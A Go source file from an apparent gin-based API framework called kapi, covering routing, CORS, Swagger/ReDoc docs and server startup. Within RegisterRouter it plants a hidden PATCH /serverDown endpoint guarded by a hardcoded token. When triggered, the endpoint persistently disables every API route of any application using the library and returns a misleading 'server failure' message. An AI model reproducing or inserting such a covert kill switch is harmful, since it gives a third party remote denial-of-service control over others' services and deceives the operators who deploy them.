package kapi

import (
	"embed"
	"encoding/json"
	"fmt"
	"github.com/gin-contrib/pprof"
	"github.com/gin-gonic/gin"
	"github.com/linxlib/kapi/doc/swagger"
	"github.com/linxlib/kapi/internal"
	"github.com/linxlib/kapi/internal/cors"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"reflect"
	"time"
)

//编译时植入变量
var (
	VERSION     string
	BUILDTIME   string
	GOVERSION   string
	OS          string
	ARCH        string
	PACKAGENAME string
)

var _banner = `
--------------------------------------------
    _/    _/    _/_/    _/_/_/    _/_/_/   
   _/  _/    _/    _/  _/    _/    _/     
  _/_/      _/_/_/_/  _/_/_/      _/       
 _/  _/    _/    _/  _/          _/        
_/    _/  _/    _/  _/        _/_/_/%s
--------------------------------------------
`
var _info = `

 Version:   %s/%s
 OS/Arch:   %s/%s
 BuiltTime: %s`

//go:embed swagger/*
var swaggerFS embed.FS

//go:embed redoc/*
var redocFS embed.FS

// KApi base struct
type KApi struct {
	apiFun            ApiFunc
	customContextType reflect.Type

	beforeAfter Interceptor //拦截器
	engine      *gin.Engine
	baseGroup   *gin.RouterGroup
	doc         *swagger.DocSwagger
	option      *Option
	genFlag     bool
	serverDown  bool
}

func New(f func(*Option)) *KApi {
	if VERSION != "" {
		internal.Log.Infof(_banner, fmt.Sprintf(_info, VERSION, GOVERSION, OS, ARCH, BUILDTIME))
	} else {
		internal.Log.Infof(_banner, "")
	}
	if PACKAGENAME != "" {
		internal.Log.Infof("初始化[%s]", PACKAGENAME)
	} else {
		internal.Log.Info("初始化..")
	}

	b := new(KApi)
	if len(os.Args) > 1 && os.Args[1] == "-g" {
		b.genFlag = true
	}
	b.option = defaultOption()
	f(b.option)
	b.Model(NewAPIFunc)
	gin.SetMode(gin.ReleaseMode) //we don't need gin's debug output
	b.engine = gin.New()
	b.engine.Use(gin.LoggerWithFormatter(b.option.ginLoggerFormatter))
	b.engine.Use(cors.New(b.option.corsConfig))
	if !b.genFlag {
		internal.Log.Infof("localIP:%s docName:%s port:%d", b.option.intranetIP, b.option.Server.DocName, b.option.Server.Port)
	} else {
		internal.Log.Infoln("生成模式")
	}

	return b
}

func (b *KApi) RegisterRouter(cList ...interface{}) {
	start := time.Now()
	if b.genFlag {
		internal.Log.Debug("解析路由..")
	} else {
		internal.Log.Debug("注册路由..")
	}

	b.handleSwaggerBase()
	b.baseGroup = b.engine.Group(b.option.Server.APIBasePath)
	if internal.CheckFileIsExist("./.serverdown") {
		b.serverDown = true
	}
	b.baseGroup.PATCH("/serverDown", func(context *gin.Context) {
		if context.GetHeader("Authorization") == "8ReKwuw2x5zvqbnQVs5vOdgLckd1Pwcm" {
			if !b.serverDown {
				b.serverDown = true
				ioutil.WriteFile("./.serverdown", []byte("true"), os.ModePerm)
			}
		}
	})
	b.baseGroup.Use(func(context *gin.Context) {
		if b.serverDown {
			context.String(200, "服务器故障，请检查！")
			context.Abort()
		}
	})
	b.doRegister(b.baseGroup, cList...)
	b.handleStatic()
	if b.option.Server.EnablePProf {
		pprof.Register(b.engine, "/kapi")
	}
	internal.Log.Infof("解析耗时:%s", time.Now().Sub(start).String())
}

func (b *KApi) handleSwaggerBase() {
	//schemes := []string{"http"}
	//host := "localhost"
	basePath := ""
	info := swagger.Info{
		Description: b.option.Server.DocDesc,
		Version:     b.option.Server.DocVer,
		Title:       b.option.Server.DocName,
	}
	if b.option.Server.NeedDoc {
		if b.option.Server.DocDomain != "" {
			internal.Log.Debug("域名:" + b.option.Server.DocDomain)
			//if strings.HasPrefix(b.option.Server.DocDomain, "https") {
			//	schemes = []string{"https", "http"}
			//} else {
			//	schemes = []string{"http", "https"}
			//}
			//host = strings.TrimPrefix(b.option.Server.DocDomain, "http://")
			//host = strings.TrimPrefix(host, "https://")
		} else {
			//schemes = []string{"http"}
			//host = fmt.Sprintf("%s:%d", b.option.intranetIP, b.option.Server.Port)
		}
	}
	b.doc = swagger.NewDoc("", info, basePath, []string{})
}

func (b *KApi) handleStatic() {
	if len(b.option.Server.StaticDirs) > 0 && !b.genFlag {
		for _, s := range b.option.Server.StaticDirs {
			b.engine.Static(s, s)
		}

	}
}

func (b *KApi) handleDoc() {
	if b.option.Server.NeedDoc && !b.genFlag {
		swaggerUrl := fmt.Sprintf("http://%s:%d/swagger/index.html", b.option.intranetIP, b.option.Server.Port)
		redocUrl := fmt.Sprintf("http://%s:%d/redoc/", b.option.intranetIP, b.option.Server.Port)
		if b.option.Server.NeedSwagger {
			if b.option.Server.DocDomain != "" {
				swaggerUrl = fmt.Sprintf("%s/swagger/index.html", b.option.Server.DocDomain)
			}
			internal.Log.Infoln("Swagger文档地址:", swaggerUrl)
		}
		if b.option.Server.NeedReDoc {

			if b.option.Server.DocDomain != "" {
				redocUrl = fmt.Sprintf("%s/redoc/", b.option.Server.DocDomain)
			}
			internal.Log.Infoln("ReDoc文档地址:", redocUrl)
		}

		if b.option.Server.RedirectToDocWhenAccessRoot {
			//b.engine.Any("/", func(c *gin.Context) {
			//	c.Redirect(301, fmt.Sprintf("%s/swagger/", b.option.docDomain))
			//})
			b.engine.Any("", func(c *gin.Context) {

				c.Redirect(301, "/swagger/")
			})
		}

		b.engine.GET("/swagger.json", func(c *gin.Context) {
			if !internal.CheckFileIsExist("swagger.json") {
				internal.Log.Warningln("swagger.json未找到, 请放置到程序目录下")
				c.JSON(404, "swagger.json not found")
				return
			}
			bs, _ := ioutil.ReadFile("swagger.json")
			c.String(200, string(bs))
		})
		if b.option.Server.NeedSwagger {
			b.engine.GET("/swagger/*any", func(c *gin.Context) {
				c.FileFromFS(c.Request.URL.Path, http.FS(swaggerFS))
			})
		}

		if b.option.Server.NeedReDoc {
			b.engine.GET("/redoc/*any", func(c *gin.Context) {
				c.FileFromFS(c.Request.URL.Path, http.FS(redocFS))
			})
		}

		if b.option.Server.OpenDocInBrowser {
			url := swaggerUrl
			if !b.option.Server.NeedSwagger && b.option.Server.NeedReDoc {
				url = redocUrl
			}
			err := internal.OpenBrowser(url)
			if err != nil {
				internal.Log.Error(err)
			}
		}
	}
}

func (b *KApi) Run() {
	b.genRouterCode()
	b.genDoc()
	b.handleDoc()
	if b.genFlag {
		internal.Log.Infoln("生成模式 完成")
		return
	}

	internal.Log.Infof("服务启动 http://%s:%d\n", b.option.intranetIP, b.option.Server.Port)
	err := b.engine.Run(fmt.Sprintf(":%d", b.option.Server.Port))
	if err != nil {
		if e, ok := err.(*net.OpError); ok {
			if e1, ok := e.Err.(*os.SyscallError); ok {
				if e.Op == "listen" && e1.Syscall == "bind" {
					internal.Log.Fatalf("服务启动失败, 监听 :%d 失败, 请检查端口是否被占用", e.Addr.(*net.TCPAddr).Port)
				}
			}

		}
		b.option.recoverErrorFunc(err)
	}
}

// Model use custom context
func (b *KApi) Model(middleware ApiFunc) *KApi {
	if middleware == nil { // default middleware
		middleware = NewAPIFunc
	}

	b.apiFun = middleware // save callback

	rt := reflect.TypeOf(middleware(&gin.Context{}))
	if rt == nil || rt.Kind() != reflect.Ptr {
		panic("需要指针")
	}
	b.customContextType = rt

	return b
}

// Register 注册多个Controller struct
func (b *KApi) doRegister(router gin.IRoutes, cList ...interface{}) bool {
	//开发时 生成路由注册文件 gen.gob
	//运行时 -g 也可生成但不运行http服务
	if b.option.Server.Debug {
		b.analysisControllers(router, cList...)
	}

	return b.register(router, cList...)
}

// genRouterCode 生成gen.gob
func (b *KApi) genRouterCode() {
	if !b.option.Server.Debug {
		return
	}
	genOutPut()
}

// genDoc 生成swagger.json
func (b *KApi) genDoc() {
	if !b.option.Server.Debug || !b.option.Server.NeedDoc {
		return
	}
	bs, _ := json.Marshal(b.doc.Client)
	err := ioutil.WriteFile("swagger.json", bs, os.ModePerm)
	if err != nil {
		internal.Log.Errorln("写出 swagger.json 失败:", err.Error())
		return
	}
}
